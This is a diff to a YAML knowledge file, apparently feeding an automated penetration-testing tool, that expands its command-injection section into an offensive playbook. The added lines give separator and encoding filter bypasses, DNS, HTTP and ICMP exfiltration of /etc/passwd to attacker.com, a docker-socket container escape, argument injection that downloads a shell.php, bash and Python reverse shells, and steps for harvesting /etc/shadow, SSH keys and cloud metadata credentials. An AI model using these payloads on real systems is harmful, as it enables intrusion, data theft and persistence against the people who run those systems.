@@ -7,6 +7,8 @@ techniques:
   - "Output-based command injection"
   - "Filter bypass techniques"
   - "Command chaining methods"
+  - "Language-specific sink exploitation"
+  - "Container escape via injection"
 tools:
   - commix
   - nuclei
@@ -14,61 +16,129 @@ tools:
 knowledge: |
   Command injection occurs when an application passes unsafe user input to a system shell,
   allowing attackers to execute arbitrary operating system commands.
-  
-  ## Injection Contexts:
-  1. **Direct Injection**: Commands executed and output returned
-  2. **Blind Injection**: Commands executed but no direct output
-  3. **Time-Based**: Use delays to confirm command execution
-  4. **Error-Based**: Trigger errors to confirm injection
-  
-  ## Detection Methods:
-  - **Command Separators**: Use ;, &&, ||, |, `, $()
-  - **Time Delays**: sleep, ping, timeout commands
-  - **File Operations**: Create, read, or modify files
-  - **Network Requests**: Make outbound connections
-  
-  ## Operating System Specifics:
-  - **Linux/Unix**: bash, sh, curl, wget, nc
-  - **Windows**: cmd, powershell, ping, timeout
-  - **Cross-Platform**: Python, node, java execution
-  
-  ## Advanced Techniques:
-  - **Filter Evasion**: Use alternative command syntax
-  - **Encoding**: Base64, hex, URL encoding
-  - **Environment Variables**: Exploit $PATH, $HOME
-  - **Wildcard Abuse**: Use *, ?, [] for obfuscation
+
+  ## Shell Metacharacter Arsenal
+  **bash/sh**: ; (sequence), && (AND), || (OR), | (pipe), `cmd` (backtick substitution),
+  $(cmd) (dollar substitution), $((cmd)) (arithmetic — rarely filtered), > >> (redirect),
+  < (input redirect), \n %0a (newline — often missed by filters), & (background exec)
+  **cmd.exe**: & (sequence), && (AND), || (OR), | (pipe), > >> (redirect),
+  %0a (newline in some parsers), ^ (escape char — c^a^l^c bypasses keyword filters)
+  **PowerShell**: ; (sequence), | (pipe), $() (subexpression), & (call operator),
+  Invoke-Expression, iex, -EncodedCommand for base64, Start-Process,
+  $env:COMSPEC — when powershell is called from cmd context
+
+  ## Detection — Separator Cycling
+  Test each separator systematically against the target. When one is blocked, try the next.
+  Order of likelihood to be missed by filters: %0a (newline) > $() > `` > || > && > ; > |
+  For numeric/path injection points where quotes aren't needed: $(whoami) or `whoami` inline.
+  When input is inside double quotes in shell: "input$(whoami)rest" — $() still expands.
+  When input is inside single quotes: single quotes prevent expansion — must break out first.
+
+  ## Blind Exfiltration Channels
+  **DNS**: curl http://$(whoami).attacker.com, nslookup $(whoami).attacker.com,
+  ping -c1 $(whoami).attacker.com — most reliable through firewalls
+  **HTTP callback**: curl http://attacker.com/$(cat /etc/passwd|base64),
+  wget http://attacker.com/?d=$(id) — check egress filtering first
+  **Timing**: sleep 5 (linux), ping -n 6 127.0.0.1 (windows, ~5s), timeout 5 (linux),
+  python -c "import time;time.sleep(5)" — cross-platform fallback.
+  Use conditional timing: if [ $(whoami) = "root" ]; then sleep 5; fi — boolean data extraction.
+  **File write + read**: echo output > /var/www/html/out.txt — if web root is writable.
+  **ICMP exfil**: xxd -p -c 16 /etc/passwd | while read line; do ping -c1 -p $line attacker.com; done
+
+  ## Filter Bypass Variants
+  **Variable expansion**: w${IFS}hoami, cat$IFS/etc/passwd — $IFS defaults to space/tab/newline.
+  $u (undefined var = empty) → wh${u}oami, c${u}at /etc/passwd
+  **Brace expansion**: {cat,/etc/passwd}, {echo,hello} — bash expands braces before execution
+  **Hex encoding**: echo -e "\x77\x68\x6f\x61\x6d\x69"|sh, $(printf '\x63\x61\x74') /etc/passwd
+  **Base64**: echo d2hvYW1p|base64 -d|sh — decodes "whoami" and pipes to shell
+  **Wildcard substitution**: /b?n/c?t /e?c/p?ss?d, /b[ia]n/ca[t] /etc/passwd
+  **$PATH abuse**: ${PATH:0:1} = "/" on most systems — reconstruct paths character by character
+  **Backslash insertion**: w\ho\am\i, c\at /e\tc/p\asswd — shell strips single backslashes
+  **Quote insertion**: w'h'o'a'm'i, w"h"o"a"m"i — shell concatenates adjacent strings
+  **Rev trick**: echo 'imaohw' | rev — reverse command string to dodge keyword filters
+  **Star globbing**: /???/??t /???/??????, /bin/ca* /etc/pas* — when specific commands are blocked
+
+  ## Language-Specific Injection Sinks
+  **PHP**: system(), exec(), passthru(), shell_exec(), popen(), proc_open(), pcntl_exec(),
+  backtick operator `cmd`, preg_replace with /e modifier (deprecated but exists in legacy code)
+  **Python**: os.system(), os.popen(), subprocess.call/run/Popen, commands.getoutput() (py2),
+  eval()/exec() when user input reaches them — also pickle.loads() for deserialization→RCE
+  **Node.js**: child_process.exec() (shell=true by default!), child_process.execSync(),
+  child_process.spawn with shell:true, require('child_process').execFileSync when args unsanitized
+  **Ruby**: system(), exec(), `backticks`, %x{}, IO.popen(), Open3, Kernel.open() if filename
+  starts with | (pipe) — Kernel.open("|whoami") executes command
+  **Java**: Runtime.getRuntime().exec(), ProcessBuilder, channels via JNDI/deserialization
+  **Go**: exec.Command() — safe by default (no shell), but if wrapped in sh -c then injectable
+
+  ## Containerized/Restricted Shell Escapes
+  When you land in a container or restricted shell:
+  - Check: cat /proc/1/cgroup, ls /.dockerenv, hostname — confirms container
+  - Mounted docker socket: find / -name docker.sock → docker -H unix:///path/docker.sock run -v /:/host alpine chroot /host
+  - Writable /proc/sysrq-trigger, /dev, or cap_sys_admin → kernel exploits viable
+  - rbash/restricted bash: use vi/vim :!sh, awk 'BEGIN{system("/bin/sh")}', python -c 'import pty;pty.spawn("/bin/sh")'
+  - find / -perm -4000 2>/dev/null → SUID binaries for privilege escalation
+  - GTFOBins: check every available binary (less, more, man, nmap, vim, python, perl, etc.)
+  - When outbound traffic is blocked: try ICMP, DNS, or write to shared volumes
+
+  ## Argument Injection
+  When command is fixed but args are user-controlled:
+  - Git: --upload-pack='touch /tmp/pwned', --exec='cmd'
+  - Curl/wget: -o /var/www/shell.php http://attacker.com/shell
+  - tar: --checkpoint=1 --checkpoint-action=exec=cmd — classic cron wildcard exploit
+  - find: -exec cmd {} \;
+  - ssh: -o ProxyCommand='cmd'
+  Pattern: look for --option=value injection when the binary supports execution options.
+
+  ## Chaining — Command Injection as Pivot
+  cmdi → reverse shell: bash -i >& /dev/tcp/attacker/port 0>&1, or
+  python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+  cmdi → credential harvesting: cat /etc/shadow, env, find / -name "*.conf" -exec grep -l pass {} \;
+  cmdi → persistence: crontab injection, SSH key addition, systemd service creation
+  cmdi → lateral movement: read ~/.ssh/id_rsa, harvest cloud metadata (169.254.169.254),
+  access internal services via curl/wget, pivot through trusted host relationships
+  cmdi → cloud escalation: curl metadata endpoint → IAM creds → AWS/GCP/Azure API access
 examples:
   - title: "Basic Command Injection"
     description: "Simple command chaining with semicolon"
     payload: "; whoami"
     validation: "Check if username appears in response"
-  - title: "Blind Time-Based Injection"
-    description: "Use sleep command to confirm injection"
-    payload: "; sleep 5"
-    validation: "Measure response time - 5+ second delay indicates success"
-  - title: "Output Redirection"
-    description: "Redirect command output to web-accessible location"
-    payload: "; whoami > /var/www/html/output.txt"
-    validation: "Check if output.txt is accessible via web browser"
-  - title: "Backtick Command Substitution"
-    description: "Use backticks for command substitution"
-    payload: "`whoami`"
-    validation: "Look for username in response or error messages"
-  - title: "Filter Bypass - Concatenation"
-    description: "Bypass keyword filters using string concatenation"
-    payload: "; who$()ami"
-    validation: "Test if empty variable expansion bypasses filters"
-  - title: "Windows Command Injection"
-    description: "Windows-specific command injection"
-    payload: "& echo %USERNAME%"
-    validation: "Check if Windows username appears in response"
+  - title: "Blind DNS Exfiltration"
+    description: "Exfiltrate command output via DNS"
+    payload: "; nslookup $(whoami).attacker.com"
+    validation: "DNS query received at attacker-controlled nameserver"
+  - title: "Newline Separator Bypass"
+    description: "Use URL-encoded newline to bypass semicolon filters"
+    payload: "%0awhoami"
+    validation: "Command output appears after filter evasion"
+  - title: "IFS Variable Bypass"
+    description: "Use $IFS to replace filtered spaces"
+    payload: ";cat$IFS/etc/passwd"
+    validation: "Passwd file contents returned without using space character"
+  - title: "Base64 Encoded Command"
+    description: "Bypass keyword filters with base64 encoding"
+    payload: ";echo d2hvYW1p|base64 -d|sh"
+    validation: "Decoded command executes — whoami output returned"
+  - title: "Windows PowerShell Injection"
+    description: "PowerShell execution via command injection"
+    payload: "& powershell -c \"$env:USERNAME\""
+    validation: "Windows username returned via PowerShell execution"
+  - title: "Argument Injection via Git"
+    description: "Inject arguments into git commands"
+    payload: "--upload-pack='touch /tmp/pwned'"
+    validation: "File /tmp/pwned created on target system"
+  - title: "Brace Expansion Bypass"
+    description: "Use bash brace expansion to avoid spaces and filters"
+    payload: ";{cat,/etc/passwd}"
+    validation: "File contents returned via brace expansion"
 validation_methods:
   - "Execute 'whoami' or 'id' commands to identify current user"
   - "Use 'sleep' or 'ping' commands to create time delays"
   - "Create temporary files and check if they exist"
   - "Make DNS queries to controlled domains"
   - "Execute 'uname -a' or 'systeminfo' for system information"
-  - "Test different command separators (;, &&, ||, |)"
+  - "Test different command separators (;, &&, ||, |, %0a)"
+  - "Use out-of-band HTTP/DNS callbacks for blind confirmation"
+  - "Check for argument injection when command is fixed but args are controllable"
 references:
   - "https://owasp.org/www-community/attacks/Command_Injection"
   - "https://portswigger.net/web-security/os-command-injection"
